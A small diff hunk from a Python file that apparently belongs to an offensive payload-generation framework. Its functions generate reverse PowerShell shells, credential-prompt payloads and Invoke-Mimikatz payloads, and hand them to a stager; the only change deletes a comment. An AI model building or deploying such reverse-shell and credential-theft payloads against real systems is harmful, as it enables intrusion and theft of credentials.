@@ -138,7 +138,7 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
     return "pass"
 
 
-#update this
+
 def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     clientnumber = int(clientUpload(payloadname,payloadchoice,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
     from stager import returnServerList
